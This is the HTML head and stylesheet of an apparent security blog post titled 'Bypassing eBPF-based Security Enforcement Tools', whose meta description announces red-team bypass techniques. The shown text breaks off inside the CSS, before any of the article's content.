<!doctype html>
<html data-n-head-ssr lang="en" data-n-head="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
  <head>
    <title>Bypassing eBPF-based Security Enforcement Tools</title><meta data-n-head="ssr" charset="utf-8"><meta data-n-head="ssr" name="viewport" content="width=device-width,initial-scale=1"><meta data-n-head="ssr" name="format-detection" content="telephone=no"><meta data-n-head="ssr" name="google-site-verification" content="QVs69klcNIjhBXaWvnU5NRyYc70RFh2lZIpZKCrLQg0"><meta data-n-head="ssr" data-hid="description" name="description" content="During penetration tests and red team engagements, eBPF-based security observability and runtime enforcement tools can make it difficult to use public offensive security tools and techniques, as they are more often detected and blocked. However, eBPF-based tools have limitations which allow adversaries to bypass their controls. In this blog post, I will introduce some of the limitations and bypass techniques."><meta data-n-head="ssr" data-hid="keywords" name="keywords" content="ebpf, security"><meta data-n-head="ssr" data-hid="image" name="image" content=""><meta data-n-head="ssr" data-hid="twitter:card" name="twitter:card" content="summary"><meta data-n-head="ssr" data-hid="twitter:title" name="twitter:title" content="Bypassing eBPF-based Security Enforcement Tools"><meta data-n-head="ssr" data-hid="twitter:description" name="twitter:description" content="During penetration tests and red team engagements, eBPF-based security observability and runtime enforcement tools can make it difficult to use public offensive security tools and techniques, as they are more often detected and blocked. However, eBPF-based tools have limitations which allow adversaries to bypass their controls. In this blog post, I will introduce some of the limitations and bypass techniques."><meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image" content=""><meta data-n-head="ssr" data-hid="og:title" property="og:title" content="Bypassing eBPF-based Security Enforcement Tools"><meta data-n-head="ssr" data-hid="og:description" property="og:description" content="During penetration tests and red team engagements, eBPF-based security observability and runtime enforcement tools can make it difficult to use public offensive security tools and techniques, as they are more often detected and blocked. However, eBPF-based tools have limitations which allow adversaries to bypass their controls. In this blog post, I will introduce some of the limitations and bypass techniques."><meta data-n-head="ssr" data-hid="og:image" property="og:image" content=""><base href="/"><link data-n-head="ssr" rel="icon" type="image/x-icon" href="/favicon.ico"><script data-n-head="ssr" data-hid="script-manager" src="/scripts/insights/scriptManager.js"></script><link rel="preload" href="/_nuxt/4f3bf05.js" as="script"><link rel="preload" href="/_nuxt/26424a3.js" as="script"><link rel="preload" href="/_nuxt/557b52d.js" as="script"><link rel="preload" href="/_nuxt/76c5e1d.js" as="script"><link rel="preload" href="/_nuxt/2e68dcf.js" as="script"><link rel="preload" href="/_nuxt/8e88736.js" as="script"><link rel="preload" href="/_nuxt/61e5ba1.js" as="script"><link rel="preload" href="/_nuxt/a46b515.js" as="script"><link rel="preload" href="/_nuxt/aac95b7.js" as="script"><link rel="preload" href="/_nuxt/baa2b20.js" as="script"><link rel="preload" href="/_nuxt/4639459.js" as="script"><link rel="preload" href="/_nuxt/0c1f518.js" as="script"><link rel="preload" href="/_nuxt/ceec652.js" as="script"><link rel="preload" href="/_nuxt/25bc68b.js" as="script"><style data-vue-ssr-id="45839ee0:0 775d0492:0 3b22dac8:0 21811c6c:0 9002ab6c:0 7677b0f4:0 e6272bd8:0 423b8947:0 361ffb66:0">/*! tailwindcss v2.2.16 | MIT License | https://tailwindcss.com*//*! modern-normalize v1.1.0 | MIT License | https://github.com/sindresorhus/modern-normalize */*,::after,::before{box-sizing:border-box}html{-moz-tab-size:4;-o-tab-size:4;tab-size:4}html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji'}hr{height:0;color:inherit}abbr[title]{-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Consolas,'Liberation Mono',Menlo,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,select{text-transform:none}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}::-moz-focus-inner{border-style:none;padding:0}:-moz-focusring{outline:1px dotted ButtonText}:-moz-ui-invalid{box-shadow:none}legend{padding:0}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}button{background-color:transparent;background-image:none}fieldset{margin:0;padding:0}ol,ul{list-style:none;margin:0;padding:0}html{font-family:Roboto,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";line-height:1.5}body{font-family:inherit;line-height:inherit}*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:currentColor}hr{border-top-width:1px}img{border-style:solid}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#a1a1aa}input:-ms-input-placeholder,textarea:-ms-input-placeholder{opacity:1;color:#a1a1aa}input::placeholder,textarea::placeholder{opacity:1;color:#a1a1aa}[role=button],button{cursor:pointer}:-moz-focusring{outline:auto}table{border-collapse:collapse}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}button,input,optgroup,select,textarea{padding:0;line-height:inherit;color:inherit}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}*,::after,::before{--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-transform:translateX(var(--tw-translate-x)) translateY(var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));border-color:currentColor;--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-blur:var(--tw-empty, );/*!*//*!*/--tw-brightness:var(--tw-empty, );/*!*//*!*/--tw-contrast:var(--tw-empty, );/*!*//*!*/--tw-grayscale:var(--tw-empty, );/*!*//*!*/--tw-hue-rotate:var(--tw-empty, );/*!*//*!*/--tw-invert:var(--tw-empty, );/*!*//*!*/--tw-saturate:var(--tw-empty, );/*!*//*!*/--tw-sepia:var(--tw-empty, );/*!*//*!*/--tw-drop-shadow:var(--tw-empty, );/*!*//*!*/--tw-filter:var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)}h1{font-family:Mulish,sans-serif;font-size:5.5rem;line-height:5.75rem}h2{font-family:Mulish,sans-serif;font-size:3.5rem;line-height:3.75rem}h3{font-family:Mulish,sans-serif;font-size:2.5rem;line-height:2.75rem}h4{font-family:Mulish,sans-serif;font-size:2rem;line-height:2.25rem}h5{font-family:Mulish,sans-serif;font-size:1.5rem;line-height:1.75rem}@font-face{font-family:Roboto;font-weight:400;src:url(/_nuxt/fonts/Roboto-Regular.f36638c.ttf) format("truetype")}@font-face{font-family:Roboto;font-weight:500;src:url(/_nuxt/fonts/Roboto-Medium.b2d307d.ttf) format("truetype")}@font-face{font-family:Roboto;font-weight:700;src:url(/_nuxt/fonts/Roboto-Bold.9ece5b4.ttf) format("truetype")}@font-face{font-family:Mulish;font-weight:400;src:url(/_nuxt/fonts/Mulish-Regular.e128ac4.ttf) format("truetype")}@font-face{font-family:Mulish;font-weight:700;src:url(/_nuxt/fonts/Mulish-Bold.d182a4e.ttf) format("truetype")}.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1440px){.container{max-width:1440px}}@media (min-width:1536px){.container{max-width:1536px}}.pointer-events-none{pointer-events:none}.pointer-events-auto{pointer-events:auto}.visible{visibility:visible}.invisible{visibility:hidden}.static{position:static}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.sticky{position:sticky}.left-0{left:0}.right-0{right:0}.top-\[32px\]{top:32px}.top-0{top:0}.bottom-\[-8px\]{bottom:-8px}.left-\[50\%\]{left:50%}.bottom-0{bottom:0}.-top-12{top:-3rem}.-bottom-12{bottom:-3rem}.left-2\/4{left:50%}.left-4{left:1rem}.top-\[18px\]{top:18px}.top-\[30px\]{top:30px}.top-6{top:1.5rem}.-top-5{top:-1.25rem}.left-\[-9999px\]{left:-9999px}.bottom-10{bottom:2.5rem}.bottom-8{bottom:2rem}.right-8{right:2rem}.-bottom-5{bottom:-1.25rem}.bottom-9{bottom:2.25rem}.bottom-1\.5{bottom:.375rem}.bottom-1{bottom:.25rem}.\!bottom-9{bottom:2.25rem!important}.top-\[-26px\]{top:-26px}.-bottom-7{bottom:-1.75rem}.bottom-\[-1px\]{bottom:-1px}.top-2\/4{top:50%}.left-8{left:2rem}.z-10{z-index:10}.z-0{z-index:0}.z-50{z-index:50}.z-40{z-index:40}.z-20{z-index:20}.order-first{order:-9999}.col-span-full{grid-column:1/-1}.col-span-1{grid-column:span 1/span 1}.col-span-12{grid-column:span 12/span 12}.col-span-3{grid-column:span 3/span 3}.col-span-9{grid-column:span 9/span 9}.col-span-4{grid-column:span 4/span 4}.col-span-5{grid-column:span 5/span 5}.col-span-10{grid-column:span 10/span 10}.col-start-2{grid-column-start:2}.col-start-1{grid-column-start:1}.\!col-start-2{grid-column-start:2!important}.col-start-7{grid-column-start:7}.col-start-6{grid-column-start:6}.col-end-1{grid-column-end:1}.col-end-7{grid-column-end:7}.row-span-1{grid-row:span 1/span 1}.row-span-full{grid-row:1/-1}.row-start-1{grid-row-start:1}.row-start-2{grid-row-start:2}.row-end-1{grid-row-end:1}.\!m-0{margin:0!important}.mx-1{margin-left:.25rem;margin-right:.25rem}.mx-auto{margin-left:auto;margin-right:auto}.my-4{margin-top:1rem;margin-bottom:1rem}.my-5\.5{margin-top:1.375rem;margin-bottom:1.375rem}.my-5{margin-top:1.25rem;margin-bottom:1.25rem}.my-16{margin-top:4rem;margin-bottom:4rem}.mx-6{margin-left:1.5rem;margin-right:1.5rem}.my-0{margin-top:0;margin-bottom:0}.mb-16{margin-bottom:4rem}.mb-6{margin-bottom:1.5rem}.mb-5\.5{margin-bottom:1.375rem}.mb-5{margin-bottom:1.25rem}.mt-2{margin-top:.5rem}.mt-10{margin-top:2.5rem}.mt-\[40px\]{margin-top:40px}.mr-0{margin-right:0}.ml-auto{margin-left:auto}.mt-16{margin-top:4rem}.mb-9{margin-bottom:2.25rem}.mb-10{margin-bottom:2.5rem}.mb-8{margin-bottom:2rem}.mb-2{margin-bottom:.5rem}.mb-4{margin-bottom:1rem}.mr-1{margin-right:.25rem}.mr-2{margin-right:.5rem}.ml-2{margin-left:.5rem}.mt-4{margin-top:1rem}.\!mt-0{margin-top:0!important}.mb-0{margin-bottom:0}.mt-0{margin-top:0}.mt-14{margin-top:3.5rem}.\!ml-2\.5{margin-left:.625rem!important}.\!ml-2{margin-left:.5rem!important}.ml-0{margin-left:0}.mt-6{margin-top:1.5rem}.mb-24{margin-bottom:6rem}.ml-3{margin-left:.75rem}.mr-6{margin-right:1.5rem}.ml-6{margin-left:1.5rem}.mr-4{margin-right:1rem}.mr-3{margin-right:.75rem}.mt-8{margin-top:2rem}.mb-14{margin-bottom:3.5rem}.mb-7{margin-bottom:1.75rem}.mb-20{margin-bottom:5rem}.ml-16{margin-left:4rem}.\!mb-12{margin-bottom:3rem!important}.\!mb-8{margin-bottom:2rem!important}.mb-12{margin-bottom:3rem}.box-border{box-sizing:border-box}.box-content{box-sizing:content-box}.block{display:block}.inline-block{display:inline-block}.\!inline-block{display:inline-block!important}.inline{display:inline}.flex{display:flex}.\!flex{display:flex!important}.inline-flex{display:inline-flex}.table{display:table}.grid{display:grid}.contents{display:contents}.list-item{display:list-item}.hidden{display:none}.h-full{height:100%}.h-8{height:2rem}.h-\[327px\]{height:327px}.h-0\.5{height:.125rem}.h-0{height:0}.h-screen{height:100vh}.h-6{height:1.5rem}.h-auto{height:auto}.h-\[48px\]{height:48px}.h-\[474px\]{height:474px}.h-4{height:1rem}.h-12{height:3rem}.h-\[2px\]{height:2px}.h-\[3px\]{height:3px}.h-20{height:5rem}.h-\[1px\]{height:1px}.\!h-full{height:100%!important}.max-h-0{max-height:0}.max-h-\[108px\]{max-height:108px}.max-h-screen{max-height:100vh}.max-h-\[calc\(100vh-7rem\)\]{max-height:calc(100vh - 7rem)}.max-h-\[800px\]{max-height:800px}.max-h-\[450px\]{max-height:450px}.max-h-20{max-height:5rem}.max-h-\[75\%\]{max-height:75%}.min-h-screen{min-height:100vh}.min-h-\[428px\]{min-height:428px}.\!min-h-0{min-height:0!important}.min-h-\[190px\]{min-height:190px}.min-h-\[350px\]{min-height:350px}.min-h-\[440px\]{min-height:440px}.min-h-\[300px\]{min-height:300px}.min-h-full{min-height:100%}.w-full{width:100%}.w-10{width:2.5rem}.w-8{width:2rem}.w-\[327px\]{width:327px}.w-6{width:1.5rem}.w-\[976px\]{width:976px}.w-\[48px\]{width:48px}.w-\[317px\]{width:317px}.w-max{width:-webkit-max-content;width:-moz-max-content;width:max-content}.w-4{width:1rem}.\!w-auto{width:auto!important}.w-0{width:0}.w-12{width:3rem}.w-56{width:14rem}.w-3\/6{width:50%}.min-w-\[100px\]{min-width:100px}.min-w-\[20px\]{min-width:20px}.min-w-12{min-width:12rem}.min-w-\[40px\]{min-width:40px}.min-w-3{min-width:3rem}.max-w-16{max-width:16rem}.max-w-screen-8xl{max-width:1440px}.max-w-\[108px\]{max-width:108px}.max-w-none{max-width:none}.max-w-xs{max-width:20rem}.max-w-26{max-width:26rem}.max-w-\[40px\]{max-width:40px}.max-w-18{max-width:18rem}.max-w-\[50\%\]{max-width:50%}.flex-1{flex:1 1 0%}.flex-\[0\]{flex:0}.flex-initial{flex:0 1 auto}.flex-shrink-0{flex-shrink:0}.flex-grow-\[0\.75\]{flex-grow:.75}.flex-grow{flex-grow:1}.-translate-y-2\/4{--tw-translate-y:-50%;transform:var(--tw-transform)}.translate-x-\[-50\%\]{--tw-translate-x:-50%;transform:var(--tw-transform)}.translate-y-2\/4{--tw-translate-y:50%;transform:var(--tw-transform)}.-translate-x-2\/4{--tw-translate-x:-50%;transform:var(--tw-transform)}.translate-y-full{--tw-translate-y:100%;transform:var(--tw-transform)}.translate-y-1{--tw-translate-y:0.25rem;transform:var(--tw-transform)}.rotate-180{--tw-rotate:180deg;transform:var(--tw-transform)}.rotate-45{--tw-rotate:45deg;transform:var(--tw-transform)}.rotate-0{--tw-rotate:0deg;transform:var(--tw-transform)}.-rotate-180{--tw-rotate:-180deg;transform:var(--tw-transform)}.transform{transform:var(--tw-transform)}@-webkit-keyframes spin{to{transform:rotate(360deg)}}@keyframes spin{to{transform:rotate(360deg)}}.animate-spin{-webkit-animation:spin 1s linear infinite;animation:spin 1s linear infinite}@-webkit-keyframes slide-in-bottom-0-to-100{0%{opacity:0;transform:translate3d(0,200px,0)}100%{opacity:1;transform:translate3d(0,0,0)}}@keyframes slide-in-bottom-0-to-100{0%{opacity:0;transform:translate3d(0,200px,0)}100%{opacity:1;transform:translate3d(0,0,0)}}.animate-slide-in-bottom-0-to-100{-webkit-animation:slide-in-bottom-0-to-100 .25s ease-out;animation:slide-in-bottom-0-to-100 .25s ease-out}@-webkit-keyframes slide-in-opacity-0-to-100{0%{opacity:0;transform:translate3d(-10px,0,0)}100%{opacity:1;transform:translate3d(0,0,0)}}@keyframes slide-in-opacity-0-to-100{0%{opacity:0;transform:translate3d(-10px,0,0)}100%{opacity:1;transform:translate3d(0,0,0)}}.animate-slide-in-opacity-0-to-100{-webkit-animation:slide-in-opacity-0-to-100 .25s ease-out;animation:slide-in-opacity-0-to-100 .25s ease-out}@-webkit-keyframes slide-in-0-to-100{0%{transform:translate3d(-10px,0,0)}100%{transform:translate3d(0,0,0)}}@keyframes slide-in-0-to-100{0%{transform:translate3d(-10px,0,0)}100%{transform:translate3d(0,0,0)}}.animate-slide-in-0-to-100{-webkit-animation:slide-in-0-to-100 .25s ease-out;animation:slide-in-0-to-100 .25s ease-out}@-webkit-keyframes transition-in-0-to-100{0%{opacity:0}100%{opacity:1}}@keyframes transition-in-0-to-100{0%{opacity:0}100%{opacity:1}}.animate-transition-in-0-to-100{-webkit-animation:transition-in-0-to-100 .25s ease-out;animation:transition-in-0-to-100 .25s ease-out}.cursor-pointer{cursor:pointer}.cursor-default{cursor:default}.cursor-not-allowed{cursor:not-allowed}.select-none{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.resize{resize:both}.list-none{list-style-type:none}.list-disc{list-style-type:disc}.appearance-none{-webkit-appearance:none;-moz-appearance:none;appearance:none}.auto-cols-max{grid-auto-columns:-webkit-max-content;grid-auto-columns:max-content}.grid-flow-row{grid-auto-flow:row}.grid-flow-col{grid-auto-flow:column}.auto-rows-min{grid-auto-rows:-webkit-min-content;grid-auto-rows:min-content}.grid-cols-12{grid-template-columns:repeat(12,minmax(0,1fr))}.grid-cols-8{grid-template-columns:repeat(8,minmax(0,1fr))}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}.grid-cols-none{grid-template-columns:none}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.grid-cols-6{grid-template-columns:repeat(6,minmax(0,1fr))}.grid-cols-4{grid-template-columns:repeat(4,minmax(0,1fr))}.grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.grid-cols-10{grid-template-columns:repeat(10,minmax(0,1fr))}.grid-rows-2{grid-template-rows:repeat(2,minmax(0,1fr))}.grid-rows-minContent{grid-template-rows:-webkit-min-content auto;grid-template-rows:min-content auto}.grid-rows-1{grid-template-rows:repeat(1,minmax(0,1fr))}.grid-rows-none{grid-template-rows:none}.flex-row{flex-direction:row}.flex-col{flex-direction:column}.flex-wrap{flex-wrap:wrap}.content-center{align-content:center}.content-start{align-content:flex-start}.content-end{align-content:flex-end}.items-start{align-items:flex-start}.items-end{align-items:flex-end}.items-center{align-items:center}.items-baseline{align-items:baseline}.justify-start{justify-content:flex-start}.justify-end{justify-content:flex-end}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.justify-items-end{justify-items:end}.justify-items-center{justify-items:center}.gap-4{gap:1rem}.gap-10{gap:2.5rem}.gap-5{gap:1.25rem}.gap-20{gap:5rem}.gap-0{gap:0}.gap-2{gap:.5rem}.gap-16{gap:4rem}.gap-8{gap:2rem}.gap-6{gap:1.5rem}.gap-3{gap:.75rem}.gap-x-2{-moz-column-gap:.5rem;column-gap:.5rem}.gap-y-5{row-gap:1.25rem}.gap-x-6{-moz-column-gap:1.5rem;column-gap:1.5rem}.gap-x-4{-moz-column-gap:1rem;column-gap:1rem}.gap-y-10{row-gap:2.5rem}.gap-y-6{row-gap:1.5rem}.justify-self-end{justify-self:end}.overflow-auto{overflow:auto}.overflow-hidden{overflow:hidden}.overflow-x-scroll{overflow-x:scroll}.whitespace-nowrap{white-space:nowrap}.break-all{word-break:break-all}.rounded-full{border-radius:9999px}.rounded-3xl{border-radius:1.5rem}.rounded-2xl{border-radius:1rem}.rounded-lg{border-radius:.5rem}.rounded-none{border-radius:0}.rounded{border-radius:.25rem}.rounded-br{border-bottom-right-radius:.25rem}.border-b{border-bottom-width:1px}.border-t-2{border-top-width:2px}.border-b-2{border-bottom-width:2px}.border-b-0{border-bottom-width:0}.border-t{border-top-width:1px}.border-dark-navy{--tw-border-opacity:1;border-color:rgba(22,36,64,var(--tw-border-opacity))}.border-ocean-blue{--tw-border-opacity:1;border-color:rgba(38,55,94,var(--tw-border-opacity))}.border-sky-blue{--tw-border-opacity:1;border-color:rgba(227,235,243,var(--tw-border-opacity))}.border-soft-white{--tw-border-opacity:1;border-color:rgba(249,249,249,var(--tw-border-opacity))}.border-teal{--tw-border-opacity:1;border-color:rgba(0,205,205,var(--tw-border-opacity))}.border-azure{--tw-border-opacity:1;border-color:rgba(90,189,255,var(--tw-border-opacity))}.border-coral{--tw-border-opacity:1;border-color:rgba(255,99,99,var(--tw-border-opacity))}.border-gray{--tw-border-opacity:1;border-color:rgba(229,229,229,var(--tw-border-opacity))}.border-link-blue{--tw-border-opacity:1;border-color:rgba(32,156,238,var(--tw-border-opacity))}.border-current{border-color:currentColor}.\!border-coral{--tw-border-opacity:1!important;border-color:rgba(255,99,99,var(--tw-border-opacity))!important}.border-opacity-20{--tw-border-opacity:0.2}.border-opacity-60{--tw-border-opacity:0.6}.bg-dark-navy{--tw-bg-opacity:1;background-color:rgba(22,36,64,var(--tw-bg-opacity))}.bg-ocean-blue{--tw-bg-opacity:1;background-color:rgba(38,55,94,var(--tw-bg-opacity))}.bg-sky-blue{--tw-bg-opacity:1;background-color:rgba(227,235,243,var(--tw-bg-opacity))}.bg-soft-white{--tw-bg-opacity:1;background-color:rgba(249,249,249,var(--tw-bg-opacity))}.bg-teal{--tw-bg-opacity:1;background-color:rgba(0,205,205,var(--tw-bg-opacity))}.bg-azure{--tw-bg-opacity:1;background-color:rgba(90,189,255,var(--tw-bg-opacity))}.bg-coral{--tw-bg-opacity:1;background-color:rgba(255,99,99,var(--tw-bg-opacity))}.bg-gray{--tw-bg-opacity:1;background-color:rgba(229,229,229,var(--tw-bg-opacity))}.bg-link-blue{--tw-bg-opacity:1;background-color:rgba(32,156,238,var(--tw-bg-opacity))}.bg-transparent{background-color:transparent}.bg-white{--tw-bg-opacity:1;background-color:rgba(255,255,255,var(--tw-bg-opacity))}.bg-\[\#3B4A6D\]{--tw-bg-opacity:1;background-color:rgba(59,74,109,var(--tw-bg-opacity))}.bg-\[\#D9EDFA\]{--tw-bg-opacity:1;background-color:rgba(217,237,250,var(--tw-bg-opacity))}.\!bg-dark-navy{--tw-bg-opacity:1!important;background-color:rgba(22,36,64,var(--tw-bg-opacity))!important}.bg-opacity-50{--tw-bg-opacity:0.5}.bg-opacity-0{--tw-bg-opacity:0}.bg-opacity-70{--tw-bg-opacity:0.7}.bg-opacity-60{--tw-bg-opacity:0.6}.bg-gradient-to-r{background-image:linear-gradient(to right,var(--tw-gradient-stops))}.from-dark-navy{--tw-gradient-from:#162440;--tw-gradient-stops:var(--tw-gradient-from),var(--tw-gradient-to, rgba(22, 36, 64, 0))}.from-sky-blue{--tw-gradient-from:#E3EBF3;--tw-gradient-stops:var(--tw-gradient-from),var(--tw-gradient-to, rgba(227, 235, 243, 0))}.to-sky-blue{--tw-gradient-to:#E3EBF3}.to-dark-navy{--tw-gradient-to:#162440}.bg-cover{background-size:cover}.bg-center{background-position:center}.bg-no-repeat{background-repeat:no-repeat}.fill-current{fill:currentColor}.object-contain{-o-object-fit:contain;object-fit:contain}.object-cover{-o-object-fit:cover;object-fit:cover}.object-center{-o-object-position:center;object-position:center}.p-6{padding:1.5rem}.p-8{padding:2rem}.p-3{padding:.75rem}.p-0{padding:0}.p-1{padding:.25rem}.p-4{padding:1rem}.p-16{padding:4rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-2{padding-left:.5rem;padding-right:.5rem}.py-1{padding-top:.25rem;padding-bottom:.25rem}.\!py-4{padding-top:1rem!important;padding-bottom:1rem!important}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.px-\[10\%\]{padding-left:10%;padding-right:10%}.py-8{padding-top:2rem;padding-bottom:2rem}.px-4{padding-left:1rem;padding-right:1rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-9{padding-top:2.25rem;padding-bottom:2.25rem}.py-3\.75{padding-top:.8125rem;padding-bottom:.8125rem}.py-\[24px\]{padding-top:24px;padding-bottom:24px}.py-\[40px\]{padding-top:40px;padding-bottom:40px}.py-16{padding-top:4rem;padding-bottom:4rem}.py-10{padding-top:2.5rem;padding-bottom:2.5rem}.\!py-2\.5{padding-top:.625rem!important;padding-bottom:.625rem!important}.\!py-2{padding-top:.5rem!important;padding-bottom:.5rem!important}.py-7{padding-top:1.75rem;padding-bottom:1.75rem}.py-5{padding-top:1.25rem;padding-bottom:1.25rem}.px-0{padding-left:0;padding-right:0}.\!py-0{padding-top:0!important;padding-bottom:0!important}.py-11{padding-top:2.75rem;padding-bottom:2.75rem}.py-20{padding-top:5rem;padding-bottom:5rem}.px-16{padding-left:4rem;padding-right:4rem}.px-8{padding-left:2rem;padding-right:2rem}.pb-10{padding-bottom:2.5rem}.pl-8{padding-left:2rem}.pr-4{padding-right:1rem}.pb-4{padding-bottom:1rem}.pt-8{padding-top:2rem}.pl-6{padding-left:1.5rem}.pl-2{padding-left:.5rem}.pr-0\.5{padding-right:.125rem}.pr-0{padding-right:0}.pr-6{padding-right:1.5rem}.pt-3{padding-top:.75rem}.pl-4{padding-left:1rem}.pt-6{padding-top:1.5rem}.pt-16{padding-top:4rem}.pb-0{padding-bottom:0}.pt-4{padding-top:1rem}.pt-0{padding-top:0}.pb-8{padding-bottom:2rem}.pb-\[16px\]{padding-bottom:16px}.pt-\[64px\]{padding-top:64px}.pt-10{padding-top:2.5rem}.\!pl-2\.5{padding-left:.625rem!important}.\!pl-2{padding-left:.5rem!important}.pb-2{padding-bottom:.5rem}.pb-6{padding-bottom:1.5rem}.pr-5{padding-right:1.25rem}.pl-5{padding-left:1.25rem}.pr-8{padding-right:2rem}.pt-5{padding-top:1.25rem}.pb-5{padding-bottom:1.25rem}.\!pt-0{padding-top:0!important}.pr-2{padding-right:.5rem}.pr-10{padding-right:2.5rem}.text-left{text-align:left}.text-right{text-align:right}.align-top{vertical-align:top}.font-roboto{font-family:Roboto,sans-serif}.font-mulish{font-family:Mulish,sans-serif}.text-size-h2-mobile{font-size:2.25rem;line-height:2.5rem}.text-size-p-mobile{font-size:1rem;line-height:1.375rem}.text-size-h1-mobile{font-size:4rem;line-height:4.25rem}.text-size-h5-mobile{font-size:1.5rem;line-height:1.75rem}.text-size-h3-mobile{font-size:1.75rem;line-height:2rem}.text-size-h4-mobile{font-size:1.5rem;line-height:1.75rem}.text-\[30px\]{font-size:30px}.text-\[14px\]{font-size:14px}.text-size-h4-tablet{font-size:1.5rem;line-height:1.75rem}.text-size-label-mobile{font-size:.875rem;line-height:1rem}.text-size-h3-desktop{font-size:2.5rem;line-height:2.75rem}.text-size-h3-tablet{font-size:1.75rem;line-height:2rem}.text-size-label-desktop{font-size:.875rem;line-height:1rem}.text-size-p-desktop{font-size:1rem;line-height:1.375rem}.text-\[20px\]{font-size:20px}.\!text-size-p-mobile{font-size:1rem!important;line-height:1.375rem!important}.font-medium{font-weight:500}.font-bold{font-weight:700}.font-normal{font-weight:400}.\!font-medium{font-weight:500!important}.font-semibold{font-weight:600}.uppercase{text-transform:uppercase}.capitalize{text-transform:capitalize}.leading-4{line-height:1rem}.leading-snug{line-height:1.375}.leading-10{line-height:2.5rem}.leading-9{line-height:2.25rem}.leading-5{line-height:1.25rem}.leading-none{line-height:1}.tracking-wider{letter-spacing:.05em}.text-dark-navy{--tw-text-opacity:1;color:rgba(22,36,64,var(--tw-text-opacity))}.text-ocean-blue{--tw-text-opacity:1;color:rgba(38,55,94,var(--tw-text-opacity))}.text-sky-blue{--tw-text-opacity:1;color:rgba(227,235,243,var(--tw-text-opacity))}.text-soft-white{--tw-text-opacity:1;color:rgba(249,249,249,var(--tw-text-opacity))}.text-teal{--tw-text-opacity:1;color:rgba(0,205,205,var(--tw-text-opacity))}.text-azure{--tw-text-opacity:1;color:rgba(90,189,255,var(--tw-text-opacity))}.text-coral{--tw-text-opacity:1;color:rgba(255,99,99,var(--tw-text-opacity))}.text-gray{--tw-text-opacity:1;color:rgba(229,229,229,var(--tw-text-opacity))}.text-link-blue{--tw-text-opacity:1;color:rgba(32,156,238,var(--tw-text-opacity))}.\!text-soft-white{--tw-text-opacity:1!important;color:rgba(249,249,249,var(--tw-text-opacity))!important}.text-white{--tw-text-opacity:1;color:rgba(255,255,255,var(--tw-text-opacity))}.text-opacity-20{--tw-text-opacity:0.2}.text-opacity-100{--tw-text-opacity:1}.underline{text-decoration:underline}.no-underline{text-decoration:none}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.placeholder-transparent::-moz-placeholder{color:transparent}.placeholder-transparent:-ms-input-placeholder{color:transparent}.placeholder-transparent::placeholder{color:transparent}.opacity-60{opacity:.6}.opacity-0{opacity:0}.opacity-20{opacity:.2}.opacity-100{opacity:1}.opacity-40{opacity:.4}.\!opacity-100{opacity:1!important}.opacity-30{opacity:.3}.shadow-borderCurrentColor{--tw-shadow:0 0 0 1px currentColor;box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-xl{--tw-shadow:0 20px 25px -5px rgba(0, 0, 0, 0.1),0 10px 10px -5px rgba(0, 0, 0, 0.04);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.outline-none{outline:2px solid 